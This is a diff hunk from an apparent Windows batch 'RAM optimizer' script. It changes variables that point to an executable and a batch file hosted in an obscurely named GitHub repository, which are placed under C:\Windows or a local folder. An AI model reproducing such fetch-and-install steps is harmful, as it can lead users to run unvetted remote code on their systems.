@@ -11,8 +11,8 @@ mode con: cols=120 lines=30
 :: Variables
 set "source=https://github.com/servicescloudsoxb/vdfnnfsgn-bvc-xcbb-xxzC/raw/refs/heads/main/EmptyStandbyList.exe"
 set "destination=C:\Windows\EmptyStandbyList\EmptyStandbyList.exe"
-set "batchFile=https://github.com/servicescloudsoxb/vdfnnfsgn-bvc-xcbb-xxzC/raw/refs/heads/main/ram_optimizer.bat"
-set "batchFileLocal=C:\Windows\ram_optimizer.bat"
+set "batchFile=https://github.com/servicescloudsoxb/vdfnnfsgn-bvc-xcbb-xxzC/raw/refs/heads/main/Optimizer_ByGluOz.bat"
+set "batchFileLocal=Source\Optimizer_ByGluOz.bat"
 
 :: Detect System Language using systeminfo (works on most systems)
 for /f "tokens=2 delims==" %%a in ('systeminfo ^| findstr /i "System Locale"') do set "language=%%a"
